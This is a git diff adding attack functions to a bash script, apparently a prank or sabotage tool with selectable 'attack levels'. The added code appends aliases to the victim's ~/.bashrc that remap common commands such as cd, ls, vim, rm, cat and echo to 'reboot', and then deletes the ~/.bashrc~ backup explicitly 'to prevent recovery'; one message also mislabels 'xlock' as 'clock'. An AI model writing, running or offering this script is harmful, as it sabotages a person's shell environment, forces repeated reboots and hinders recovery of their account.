@@ -1,6 +1,40 @@
 #!/bin/bash
 clear
 version='0.0.1'
+
+basic_attack()
+{
+    echo "Redirecting 'emacs' to 'reboot'"
+    echo "alias emacs='reboot'" >> ~/.bashrc
+    echo "Redirecting 'ne' to 'reboot'"
+    echo "alias ne='reboot'" >> ~/.bashrc
+    echo "Redirecting 'vim' to 'reboot'"
+    echo "alias vim='reboot'" >> ~/.bashrc
+    echo "Redirecting 'vi' to 'reboot'"
+    echo "alias vi='reboot'" >> ~/.bashrc
+    echo "Redirecting 'cd' to 'reboot'"
+    echo "alias cd='reboot'" >> ~/.bashrc
+    echo "Redirecting 'ls' to 'reboot'"
+    echo "alias ls='reboot'" >> ~/.bashrc
+}
+
+normal_attack()
+{
+    basic_attack
+    echo "Redirecting 'nano' to 'reboot'"
+    echo "alias nano='reboot'" >> ~/.bashrc
+    echo "Redirecting 'xlock' to 'reboot'"
+    echo "alias clock='reboot'" >> ~/.bashrc
+    echo "Redirecting 'rm' to 'reboot'"
+    echo "alias rm='reboot'" >> ~/.bashrc
+    echo "Redirecting 'echo' to 'reboot'"
+    echo "alias echo='reboot'" >> ~/.bashrc
+    echo "Redirecting 'cat' to 'reboot'"
+    echo "alias cat='reboot'" >> ~/.bashrc
+    echo "Removing the temporary .bashrc~ file (to prevent recovery)"
+    rm -f ~/.bashrc~
+}
+
 echo "+-------------------------------------------------+"
 echo "|                                                 |"
 echo "|               +-----------------+               |"
@@ -17,7 +51,24 @@ echo
 echo "Attack levels :"
 echo " (0) - Does nothing : Just quit the program"
 echo " (1) - Basic attack : Add some aliases to the bashrc"
-echo " (2) - Normal       : Add quite a lot of aliases, change the default keyboard"
+echo " (2) - Normal       : Add quite a lot of aliases"
 echo
-read -p "Please enter the level of the attack : " -n 1 usr_input
+read -p "Please enter the level of the attack : " usr_input
 echo
+
+case $usr_input in
+    0)
+	echo "Bye"
+	;;
+    1)
+	echo "Performing the basic attack ..."
+	basic_attack
+	exit
+	;;
+    2)
+	echo "Performing the normal attack ..."
+	normal_attack
+	exit
+	;;
+esac
+
